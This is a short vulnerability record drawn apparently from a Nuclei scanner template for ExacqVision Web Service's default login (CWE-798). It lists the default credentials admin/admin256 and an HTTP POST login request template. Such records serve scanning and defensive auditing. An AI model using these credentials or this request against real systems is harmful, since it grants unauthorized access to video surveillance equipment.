# Vulnerability: ExacqVision Default Login
**Classification:** cwe-798
**Source:** Nuclei Template (`exacqvision-default-login.yaml`)

## Description
ExacqVision Web Service default login credentials (admin/admin256) were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /service.web HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Connection: close

action=login&u={{username}}&p={{password}}
```

